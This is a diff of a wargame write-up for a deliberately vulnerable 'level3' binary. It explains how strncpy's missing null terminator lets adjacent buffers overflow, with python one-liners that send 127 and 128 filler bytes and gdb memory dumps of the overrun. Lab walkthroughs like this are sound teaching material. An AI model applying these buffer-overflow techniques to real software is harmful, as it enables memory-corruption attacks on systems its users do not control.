@@ -83,7 +83,7 @@ int main(int argc, char **argv)
 
 > Need a hint? Okay, what differs from `strcpy()` and `strncpy()` ?
 
-Problem w/ `strncpy( char *dest, const char *src, size_t n )`: If there is no null character among the first n character of src, the string placed in dest will not be null-terminated. So `strncpy()` does not guarantee that the destination string will be NULL terminated. Hence, its buffer memory can't be directly overflow w/ that function.
+Problem w/ `strncpy( char *dest, const char *src, size_t n )`: If there is no null character among the first n character of src, the string placed in dest will not be null-terminated. So `strncpy()` does not guarantee that the destination string will be NULL terminated. Hence, its buffer memory can't be directly overflow.
 
 Problem w/ `strcpy( char *dest, const char *src )`: The `strcpy()` function does not specify the size of the destination array, so buffer overrun is often a risk (as `strcat and strcmp`).
 
@@ -100,7 +100,6 @@ Fine! By fulling the `buf2` buffer w/o null byte, it's possible to overflow the 
 ```bash
 level3@lxc-pwn-x86:/levels$ ./level3 A `python -c 'print "\x42" * 127'`
 String result: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBA
-										                                                                                                     ^
 ```
 
 ```bash
@@ -122,13 +121,11 @@ Breakpoint 2, main (argc=3, argv=0xffffdc94) at level3.c:31
 0xffffda4c:	0x42424242	0x42424242	0x42424242	0x42424242
 0xffffda5c:	0x42424242	0x42424242	0x42424242	0x42424242
 0xffffda6c:	0x00000000	0x00000041	0x00000000	0x00000000 <---------- *
-			^^^^^^^^^^
 ```
 
 ```bash
 level3@lxc-pwn-x86:/levels$ ./level3 A `python -c 'print "\x42" * 128'`
 String result: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAA
-                                                                                                     										  ^^
 ```
 
 ```bash
@@ -150,7 +147,6 @@ Breakpoint 2, main (argc=3, argv=0xffffdc94) at level3.c:31
 0xffffda4c:	0x42424242	0x42424242	0x42424242	0x42424242
 0xffffda5c:	0x42424242	0x42424242	0x42424242	0x42424242
 0xffffda6c:	0x42424242	0x00000041	0x00000000	0x00000000 <---------- *
-			^^^^^^^^^^
 ```
 
 Since `buf2` has to be exactly 128-byte w/o null char (e.g.: bigger values are just going to be ignored by `strncpy` function), let's play w/ `buf1` and try to some value to make crash the program.
